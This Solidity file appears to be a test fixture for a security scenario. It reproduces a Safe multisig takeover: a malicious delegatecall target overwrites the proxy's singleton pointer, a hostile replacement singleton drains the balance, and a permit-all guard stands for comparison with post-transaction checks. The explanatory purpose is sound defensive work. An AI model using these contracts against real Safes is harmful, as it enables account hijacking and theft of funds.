// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

/// @notice The malicious `delegatecall` target for the control-plane scenario.
///         Executed via a Safe's `execTransaction` with `operation = DelegateCall`, it runs in
///         the Safe's own storage context and overwrites slot 0 — which is where a Safe proxy
///         keeps its singleton (implementation) pointer. From that point every call into the
///         Safe dispatches to code the attacker chose.
///
///         This is the mechanism behind the largest documented loss in the incident record:
///         signers were shown a routine transfer and approved a transaction that instead
///         rewrote the account's control plane.
contract SingletonOverwriter {
    /// @dev Deliberately writes slot 0 directly. Under `delegatecall` from a Safe proxy that
    ///      slot holds the singleton address.
    function overwrite(address newSingleton) external {
        assembly {
            sstore(0, newSingleton)
        }
    }
}

/// @notice A replacement "singleton" the attacker points the Safe at. Anything reached
///         through the hijacked proxy now runs this code; `drain` is enough to show that the
///         account is under the attacker's control.
contract HostileSingleton {
    address internal singleton;   // slot 0, mirroring the Safe proxy layout

    function drain(address payable to) external {
        to.transfer(address(this).balance);
    }

    function hijacked() external pure returns (bool) {
        return true;
    }
}

/// @notice A real Safe Transaction Guard that permits everything.
///
/// @dev The point of deploying it is the comparison, not the protection. A Safe Guard is a
///      PRECONDITION: `checkTransaction` runs before execution and sees only the proposed
///      target, value, calldata and operation, so to stop an attack it must anticipate the
///      dangerous shape in advance. A POST_TX assertion is a POSTCONDITION over actual
///      effects and needs no such foresight.
///
///      This is not a claim that Safe Guards are useless: a guard that specifically rejected
///      `DelegateCall`, or allowlisted its targets, would have blocked this attack. The
///      demonstrated difference is one of reach, and of what has to be known ahead of time.
contract PermissiveSafeGuard {
    /// @dev Enum.Operation is a uint8 in the ABI, so this matches the selector the Safe calls.
    function checkTransaction(
        address, uint256, bytes memory, uint8, uint256, uint256, uint256,
        address, address payable, bytes memory, address
    ) external {}

    function checkAfterExecution(bytes32, bool) external {}

    /// @dev Safe v1.3.0's GuardManager requires the guard to advertise ERC-165 support.
    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == 0xe6d7a83a || interfaceId == 0x01ffc9a7;
    }
}
